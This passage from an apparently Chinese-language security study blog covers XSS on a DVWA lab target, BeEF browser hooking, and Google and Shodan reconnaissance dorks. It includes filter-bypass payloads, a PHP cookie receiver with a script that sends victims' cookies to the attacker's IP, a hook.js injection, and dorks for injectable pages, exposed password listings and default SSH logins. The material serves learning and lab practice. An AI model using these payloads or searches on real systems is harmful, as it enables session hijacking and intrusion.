class="string">&#x27;Hello &#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>代码直接引用了 name 参数，并没有任何的过滤和检查</p>
</li>
<li><p>手工 XSS：用户访问网页中的 XSS 链接，服务器接受并返回，用户执行反射回来的代码并解析执行</p>
</li>
<li><p>首先在输入框中输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，然后把此时的 URL(<code>http://192.168.50.129/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27xss+attack%27%29%3C%2Fscript%3E#</code>)给任何一个机器，该机器点开链接都能触发 XSS 攻击</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">弹窗警告；页面重定向；...</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>medium security</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!array_key_exists (<span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span>) || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="literal">NULL</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$isempty</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;Hello &#x27;</span> . str_replace(<span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>对输入进行了过滤，基于黑名单的思想，使用 str_replace 函数将输入中的<code>&lt;script&gt;</code>删除，这种防护机制是可以被轻松绕过的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"># 1. 大小写混淆绕过</span><br><span class="line"></span><br><span class="line"># 2. 双写绕过</span><br><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>high security</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>(!array_key_exists (<span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span>) || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="literal">NULL</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">    </span><br><span class="line"> <span class="variable">$isempty</span> = <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;Hello &#x27;</span> . htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>php htmlspecialchars()：把预定义的字符( “&lt;” （小于）、”&gt;” （大于）、&amp; （和号）、” （双引号）、’ （单引号）)转换为 HTML 实体</li>
</ul>
</li>
</ul>
<h2 id="存储型-XSS-XSS-stored"><a href="#存储型-XSS-XSS-stored" class="headerlink" title="存储型 XSS (XSS stored)"></a>存储型 XSS (XSS stored)</h2><p>攻击者将带有 XSS 攻击的链接放在网页的某个页面，例如评论框等；用户访问此 XSS 链接并执行，由于存储型 XSS 能够攻击所有访问此页面的用户，所以危害非常大</p>
<p>留言板，用户访问网站即可触发 </p>
<ul>
<li><p>low security</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;btnSign&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$message</span> = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;mtxMessage&#x27;</span>]);</span><br><span class="line"><span class="variable">$name</span>    = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;txtName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize message input</span></span><br><span class="line"><span class="variable">$message</span> = stripslashes(<span class="variable">$message</span>);</span><br><span class="line"><span class="variable">$message</span> = mysql_real_escape_string(<span class="variable">$message</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize name input</span></span><br><span class="line"><span class="variable">$name</span> = mysql_real_escape_string(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;<span class="subst">$message</span>&#x27;,&#x27;<span class="subst">$name</span>&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>输入用户名 1111，密码为<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，然后任何一个机器点击页面的 XSS restored 都会触发 XSS 攻击</p>
<ul>
<li>获取 cookie：渗透机 Kali Linux 操作；肉鸡 windows</li>
</ul>
<ol>
<li><p>构建收集 cookie 服务器</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start apache2</span><br><span class="line">    </span><br><span class="line">vim /var/www/html/cookie_rec.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$log</span>,<span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose(<span class="variable">$log</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">chown -R www-data.www-data /var/www/</span><br></pre></td></tr></table></figure></li>
<li><p>构造 XSS 代码并植入到 web 服务器</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 通过渗透机植入XSS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">&#x27;http://192.168.50.128/cookie_rec.php?cookie=&#x27;</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"># 注：IP为Kali Linux的IP</span><br><span class="line"># 注：先清除之前植入的XSS代码 -&gt; dvwa Setup</span><br><span class="line"># 前端有限制，F12，修改前端的maxlength</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
<ol start="3">
<li>等待肉鸡触发 XSS 代码并将 cookie 发送至 Kali<img src="storexss-cookie-byhand.gif" alt="storexss-cookie-byhand" style="zoom:80%;" /></li>
<li>cookie 利用</li>
</ol>
</li>
<li><p>medium security</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;btnSign&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$message</span> = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;mtxMessage&#x27;</span>]);</span><br><span class="line">   <span class="variable">$name</span>    = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;txtName&#x27;</span>]);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// Sanitize message input</span></span><br><span class="line">   <span class="variable">$message</span> = trim(strip_tags(addslashes(<span class="variable">$message</span>)));</span><br><span class="line">   <span class="variable">$message</span> = mysql_real_escape_string(<span class="variable">$message</span>);</span><br><span class="line">   <span class="variable">$message</span> = htmlspecialchars(<span class="variable">$message</span>);</span><br><span class="line">    </span><br><span class="line">   <span class="comment">// Sanitize name input</span></span><br><span class="line">   <span class="variable">$name</span> = str_replace(<span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">   <span class="variable">$name</span> = mysql_real_escape_string(<span class="variable">$name</span>);</span><br><span class="line">  </span><br><span class="line">   <span class="variable">$query</span> = <span class="string">&quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;<span class="subst">$message</span>&#x27;,&#x27;<span class="subst">$name</span>&#x27;);&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$result</span> = mysql_query(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用<code>&lt;b&gt;</code>标签</p>
</li>
<li><p>对 message 参数使用了 htmlspecialchars 函数进行编码，无法再通过 message 参数注入 XSS 代码，但是对于 name 参数，只是简单过滤了<code>&lt;script&gt;</code>字符串，仍然存在存储型的 XSS</p>
</li>
<li><p>抓包改 name 参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 双写绕过 &lt;sc&lt;script&gt;ript&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br><span class="line"><span class="number">2.</span> 大小写混淆绕过 &lt;Script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>high security</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;btnSign&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$message</span> = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;mtxMessage&#x27;</span>]);</span><br><span class="line">   <span class="variable">$name</span>    = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;txtName&#x27;</span>]);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// Sanitize message input</span></span><br><span class="line">   <span class="variable">$message</span> = stripslashes(<span class="variable">$message</span>);</span><br><span class="line">   <span class="variable">$message</span> = mysql_real_escape_string(<span class="variable">$message</span>);</span><br><span class="line">   <span class="variable">$message</span> = htmlspecialchars(<span class="variable">$message</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// Sanitize name input</span></span><br><span class="line">   <span class="variable">$name</span> = stripslashes(<span class="variable">$name</span>);</span><br><span class="line">   <span class="variable">$name</span> = mysql_real_escape_string(<span class="variable">$name</span>); </span><br><span class="line">   <span class="variable">$name</span> = htmlspecialchars(<span class="variable">$name</span>);</span><br><span class="line">  </span><br><span class="line">   <span class="variable">$query</span> = <span class="string">&quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;<span class="subst">$message</span>&#x27;,&#x27;<span class="subst">$name</span>&#x27;);&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$result</span> = mysql_query(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>无法?</li>
<li>要注意的是，如果 htmlspecialchars 函数使用不当，攻击者就可以通过编码的方式绕过函数进行 XSS 注入，尤其是 DOM 型的 XSS</li>
</ul>
</li>
</ul>
<hr>
<h2 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h2><p>基于文档对象模型（Document Objeet Model，DOM）</p>
<p>例如服务器端经常使用 document.boby.innerHtml 等函数动态生成 html 页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生 DOM 型的 XSS</p>
<p>DOM 型 XSS 可能是存储型，也有可能是反射型</p>
<hr>
<h2 id="自动化-XSS"><a href="#自动化-XSS" class="headerlink" title="自动化 XSS"></a>自动化 XSS</h2><h3 id="BeEF-简介"><a href="#BeEF-简介" class="headerlink" title="BeEF 简介"></a>BeEF 简介</h3><blockquote>
<p>Browser Exploitation Framework (BeEF)</p>
<p>BeEF 是目前最强大的浏览器开源渗透测试框架，通过 XSS 漏洞配合 JS 脚本和 Metasploit 进行渗透</p>
<p>BeEF 是基于 Ruby 语言编写的，并且支持图形化界面，操作简单</p>
<p><a href="http://beefproject.com/">http://beefproject.com/</a></p>
<p>信息收集：</p>
<ol>
<li>网络发现</li>
<li>主机信息</li>
<li>cookie 获取</li>
<li>会话劫持</li>
<li>键盘记录</li>
<li>插件信息</li>
</ol>
<p>持久化控制：</p>
<ol>
<li>确认弹框</li>
<li>小窗口</li>
<li>中间人</li>
</ol>
<p>社会工程：</p>
<ol>
<li>点击劫持</li>
<li>弹窗告警</li>
<li>虚假页面</li>
<li>钓鱼页面</li>
</ol>
<p>渗透攻击：</p>
<ol>
<li>内网渗透</li>
<li>Metasploit</li>
<li>CSRF 攻击</li>
<li>DDOS 攻击</li>
</ol>
</blockquote>
<h3 id="BeEF-基础"><a href="#BeEF-基础" class="headerlink" title="BeEF 基础"></a>BeEF 基础</h3><ul>
<li><p>启动 Apache 和 BeEF</p>
<p>自带 BeEF 的 kali 版本：kali 2019.2</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service apache2 start </span><br><span class="line"></span><br><span class="line"><span class="comment"># 点击左侧🐂的图标</span></span><br><span class="line">ss -tnlp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要修改密码路径才能使用</span></span><br><span class="line"><span class="comment"># 修改BeEF的默认密码为1234</span></span><br><span class="line">root@kali:~<span class="comment"># vi /etc/beef-xss/config.yaml</span></span><br></pre></td></tr></table></figure></li>
<li><p>登录 BeEF：username：beef；password：beef(填写修改过的)</p>
<img src="beef-start.png" alt="image-20200812181307351" style="zoom:80%;" /></li>
<li><p>渗透机将脚本放在 DVWA 靶机中</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.50.132:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># IP地址即BeEF所在机器</span><br><span class="line"># 需修改字符数的限制</span><br></pre></td></tr></table></figure>
<img src="beef-xss.png" alt="image-20200812181821108" style="zoom:80%;" /></li>
<li><p>BeEF 页面查看肉鸡是否上线</p>
<img src="beef-machine.png" alt="image-20200812182141380" style="zoom:80%;" /></li>
</ul>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul>
<li><p>Current Browser -&gt; Details</p>
<img src="beef-details.png" alt="image-20200812182348815" style="zoom:80%;" /></li>
<li><p>Commands -&gt; Browser -&gt; Hooked Domain -&gt; Get Cookie -&gt;  Execute</p>
<blockquote>
<p>命令颜色(Color)：</p>
<p>绿色 对目标主机生效并且不可见(不会被发现)</p>
<p>橙色 对目标主机生效但可能可见(可能被发现)</p>
<p>灰色 对目标主机未必生效(可验证下)</p>
<p>红色 对目标主机不生效</p>
</blockquote>
</li>
<li><p>持久化控制</p>
</li>
<li><p>社会工程</p>
</li>
</ul>
<p>参考资料</p>
<ul>
<li><a href="https://www.freebuf.com/articles/web/123779.html">https://www.freebuf.com/articles/web/123779.html</a></li>
</ul>
<hr>
<h1 id="Web-信息收集"><a href="#Web-信息收集" class="headerlink" title="Web 信息收集"></a>Web 信息收集</h1><p>信息收集概述</p>
<blockquote>
<ol>
<li>Web 信息搜集(探测)即 Web 踩点，主要是掌握目标 Web 服务的方方面面，是实现 Web 渗透入侵前的准备工作</li>
<li>Web 踩点内容包括操作系统(Windows/Linux)、服务器类型、数据库类型、Web 容器(Web 服务器：Tomcat/Nginx/Apache)、Web 语言(php/java)、域名信息(主站、子站、没有上线的域名)、网站目录…</li>
<li>Web 信息搜集涉及搜索引擎(谷歌、撒旦、钟馗之眼)、网站扫描、域名遍历、指纹识别等工作</li>
</ol>
</blockquote>
<h2 id="搜索引擎篇"><a href="#搜索引擎篇" class="headerlink" title="搜索引擎篇"></a>搜索引擎篇</h2><h3 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h3><p>通过谷歌搜索想要的信息</p>
<h4 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h4><ul>
<li><p>site</p>
<p>功能：搜索指定的域名的网页内容，可以用来搜索子域名、跟此域名相关的内容</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">site:zhihu.com</span><br><span class="line"># 搜索跟zhihu.com相关的网页</span><br><span class="line"></span><br><span class="line">&quot;web安全&quot; site:zhihu.com</span><br><span class="line">site:zhihu.com &quot;web安全&quot;</span><br><span class="line"># 可多个关键词</span><br><span class="line"># 关键词通过双引号当成一个整体来看</span><br><span class="line"># 搜索zhihu.com跟“web安全”相关的网页</span><br><span class="line"></span><br><span class="line">&quot;教程&quot; site:pan.baidu.com</span><br><span class="line"># 在百度网盘中搜索“教程”</span><br></pre></td></tr></table></figure></li>
<li><p>filetype</p>
<p>功能：搜索指定文件类型</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;web安全&quot; filetype:pdf</span><br><span class="line"># 搜索跟“web安全”相关的pdf文件</span><br><span class="line"></span><br><span class="line">nmap filetype:ppt</span><br><span class="line"># 搜索跟nmap相关的ppt文件</span><br><span class="line"></span><br><span class="line">site:csdn.net filetype:pdf</span><br><span class="line">filetype:pdf site:csdn.net</span><br><span class="line"># 搜索csdn网站中的pdf文件</span><br><span class="line"></span><br><span class="line">site:csdn.net filetype:pdf &quot;CC攻击&quot;</span><br></pre></td></tr></table></figure></li>
<li><p>inurl</p>
<p>功能：搜索 url 网址存在特定关键字的网页，可以用来搜寻有注入点的网站</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">inurl:.php?id=</span><br><span class="line"># 搜索网址中有&quot;.php?id&quot;的网页</span><br><span class="line"></span><br><span class="line">inurl:view.php=?</span><br><span class="line"># 搜索网址中有&quot;view.php=&quot;的网页</span><br><span class="line"></span><br><span class="line">inurl:.jsp?id=</span><br><span class="line"># 搜索网址中有&quot;.jsp?id&quot;的网页</span><br><span class="line"></span><br><span class="line">inurl:.asp?id=</span><br><span class="line"># 搜索网址中有&quot;.asp?id&quot;的网页</span><br><span class="line"></span><br><span class="line">inurl: /admin/login.php</span><br><span class="line"># 搜索网址中有&quot;/admin/login.php&quot;的网页</span><br><span class="line"></span><br><span class="line">inurl:login</span><br><span class="line"># 搜索网址中有&quot;login&quot;等登录网页</span><br></pre></td></tr></table></figure></li>
<li><p>intitle</p>
<p>功能：搜索标题(也包括一些正文)存在特定关键字的网页</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">intitle:后台登录</span><br><span class="line"># 搜索网页标题是”后台登录“的相关网页</span><br><span class="line"></span><br><span class="line">intitle:后台管理 filetype:php</span><br><span class="line"># 搜索网页标题是”后台管理“的php页面</span><br><span class="line"></span><br><span class="line">intitle:index of &quot;keyword&quot;</span><br><span class="line"># 搜索此关键字相关的索引目录信息</span><br><span class="line"></span><br><span class="line">intitle:index of &quot;parent directory&quot;</span><br><span class="line"># 搜索根目录相关的索引目录信息</span><br><span class="line"></span><br><span class="line">intitle:index of &quot;password&quot;</span><br><span class="line"># 搜索密码相关的索引目录信息</span><br><span class="line"></span><br><span class="line">intitle:index of &quot;login&quot;</span><br><span class="line"># 搜索索引目录中的登录页面信息</span><br><span class="line"></span><br><span class="line">intitle:index of &quot;admin&quot;</span><br><span class="line"># 搜索索引目录中后台管理页面信息</span><br></pre></td></tr></table></figure></li>
<li><p>intext</p>
<p>功能：搜索正文存在特定关键字的网页</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">intext:Powered by Discuz</span><br><span class="line"># 搜索Discuz论坛相关的页面</span><br><span class="line"></span><br><span class="line">intext:powered by wordpress</span><br><span class="line"># 搜索wordpress制作的博客网址</span><br><span class="line"></span><br><span class="line">intext:powered by *CMS</span><br><span class="line"># 搜索*CMS相关的页面</span><br><span class="line"></span><br><span class="line">intext:Powered by xxx inurl:login</span><br><span class="line"># 搜索此类网址的后台登录页面</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 搜索美剧/电影等相关网站：</span><br><span class="line">inurl:php?id= intitle:美剧</span><br><span class="line">inurl:php?id= intitle:美女</span><br><span class="line">inurl:php?id  intitle:美女图片 intext:powered by discuz</span><br><span class="line">inurl:php?id  intitle:美女图片 intext:powered by *cms</span><br><span class="line"></span><br><span class="line"># 搜索用Discuz搭建的论坛：</span><br><span class="line">inurl:php?id intitle:电影 intext:powered by discuz</span><br><span class="line">intext:&quot;powered by discuz! 7.2&quot; inurl:faq.php intitle:论坛</span><br><span class="line"></span><br><span class="line"># 搜索使用Structs的相关网站：</span><br><span class="line">intitle:&quot;Structs Problem Report&quot;</span><br><span class="line">intitle:&quot;Structs Problem Report&quot; intext:&quot;development mode is enabled.&quot;</span><br></pre></td></tr></table></figure>

<h4 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">-keyword   强制结果不要出现此关键词，例如：电影 -黑客</span><br><span class="line">*keyword   模糊搜索，强制结果包含此关键词，例如：电影 一个叫*决定*</span><br><span class="line">&quot;keyword&quot;  强制搜索结果出现此关键词，例如：书籍 &quot;web安全&quot;</span><br><span class="line">~keyword   同时搜索keyword的近义词(比如college和university)</span><br><span class="line">2008..2012 ..显示文章内容含有指定年份时间段内的搜索结果</span><br></pre></td></tr></table></figure>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>Get More Out of Google - 有效利用谷歌搜索</p>
<ul>
<li><p>善于用搜索符</p>
</li>
<li><p>不要问谷歌问题</p>
<ul>
<li><p>比如需要一份燕子飞行速度的专业报告，燕子的飞行速度是多少[错误问法]，而是<code>filetype:pdf air speed intitle:velocity of *swallow</code></p>
</li>
<li><p>搜索作者 Dr. Ronald L. Green 和 Dr.Thomas P. Buttz. 关于光合作用的论文</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">author:green photosynthesis &quot;tp buttz&quot;</span><br><span class="line"># 搜索Green发表的论文</span><br><span class="line"># photosynthesis是普通的谷歌搜索，要找的主题关键字</span><br><span class="line"># &quot;&quot;让结果更精确，输入作者全名或者是缩写</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>定词定义：<code>define:angary</code></p>
</li>
<li><p>数学计算：直接在谷歌里输入数学算式，可包含+-*/和括号</p>
</li>
<li><p>单位换算：54 磅=？公斤</p>
</li>
<li><p>快捷键：</p>
<ul>
<li>Ctrl+L：选中浏览器地址栏</li>
</ul>
</li>
</ul>
<h3 id="Shodan-Hacking"><a href="#Shodan-Hacking" class="headerlink" title="Shodan Hacking"></a>Shodan Hacking</h3><blockquote>
<p><a href="https://www.shodan.io/">https://www.shodan.io/</a></p>
<p>Shodan(撒旦搜索引擎)是由 Web 工程师 John Matherly(马瑟利)编写的，被称为“最可怕的搜索引擎”，可扫描一切的互联网设备，如常见的 web 服务器、防火墙、路由器、交换机、摄像头、打印机等一切联网设备</p>
</blockquote>
<h4 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h4><ul>
<li><p>ip</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">114.114.114.114</span><br><span class="line"># 直接在搜索框中输入上述语句</span><br></pre></td></tr></table></figure></li>
<li><p>service / protocol</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http</span><br><span class="line"># 所有提供http服务的主机</span><br><span class="line">http country:&quot;DE&quot;</span><br><span class="line">http country:&quot;DE&quot; product:&quot;Apache httpd&quot;</span><br><span class="line">http product:&quot;Apache httpd&quot;</span><br><span class="line"></span><br><span class="line">ssh</span><br><span class="line">ssh default password</span><br><span class="line">ssh default password country:&quot;JP&quot;</span><br></pre></td></tr></table></figure></li>
<li><p>keyword</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 基于关键词搜索的思路是根据banner信息(设备指纹)来搜索</span><br><span class="line">&quot;default password&quot; country:&quot;TH&quot;</span><br><span class="line">FTP anon successful</span><br></pre></td></tr></table></figure></li>
<li><p>country</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">country:cn</span><br><span class="line">country:us</span><br><span class="line">country:jp</span><br></pre></td></tr></table></figure></li>
<li><p>product 产品</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">product:&quot;Microsoft IIS httpd&quot;</span><br><span class="line">product:&quot;nginx&quot;</span><br><span class="line">product:&quot;Apache httpd&quot;</span><br><span class="line">product:MySQL</span><br></pre></td></tr></table></figure></li>
<li><p>version</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">product:MySQL version:&quot;5.1.73&quot;</span><br><span class="line">product:&quot;Microsoft IIS httpd&quot; version:&quot;7.5&quot;</span><br></pre></td></tr></table></figure></li>
<li><p>hostname</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">hostname:.org</span><br><span class="line">hostname:.edu</span><br><span class="line">hostname:www.baidu.com</span><br></pre></td></tr></table></figure></li>
<li><p>os</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">os:&quot;Windows Server 2008 R2&quot;</span><br><span class="line">os:&quot;Windows 7 or 8&quot;</span><br><span class="line">os:&quot;Linux 2.6.x&quot;</span><br></pre></td></tr></table></figure></li>
<li><p>net</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">net:110.180.13.0/24</span><br><span class="line"># 某个网段的机器</span><br><span class="line">200 ok net:110.180.13.0/24</span><br><span class="line"># 加上返回码</span><br><span class="line">200 ok country:JP net:110.180.13.0/24</span><br></pre></td></tr></table></figure></li>
<li><p>port</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">port:3389</span><br><span class="line"># windows一般会开3389端口 mstsc打开远程桌面连接，输入计算机ip地址，之后要知道用户名和密码就可以连接</span><br><span class="line"></span><br><span class="line">port:445</span><br><span class="line"># samba</span><br><span class="line"></span><br><span class="line">port:22</span><br><span class="line">port:80</span><br><span class="line"></span><br><span class="line">port:443</span><br><span class="line"># http</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="综合案例"><a href="#综合案例" class="headerlink" title="综合案例"></a>综合案例</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 搜索日本区开启80端口的设备：</span><br><span class="line">country:jp port:80</span><br><span class="line">country:jp port:80 product:&quot;Apache httpd&quot;</span><br><span class="line">country:jp port:80 product:&quot;Apache httpd&quot; city:&quot;Tokyo&quot;</span><br><span class="line">country:jp port:80 product:&quot;Apache httpd&quot; city:&quot;Tokyo&quot; os:&quot;Linux 3.x&quot;</span><br><span class="line"></span><br><span class="line"># 搜索日本区使用Linux2.6.x系统的设备：</span><br><span class="line">country:jp os:&quot;Linux 2.6.x&quot;</span><br><span class="line">country:jp os:&quot;Linux 2.6.x&quot; port:&quot;80&quot;</span><br><span class="line">country:jp os:&quot;Linux 2.6.x&quot; port:&quot;80&quot; product:&quot;Apache httpd&quot;</span><br><span class="line"></span><br><span class="line"># 搜索日本区使用Windows Server系统的设备：</span><br><span class="line">country:jp os:&quot;Windows Server 2008 R2&quot;</span><br><span class="line">country:jp os:&quot;Windows Server 2003&quot; port:&quot;445&quot;</span><br><span class="line">country:jp os:&quot;Windows server 2003&quot; port:&quot;80&quot;</span><br><span class="line"></span><br><span class="line"># 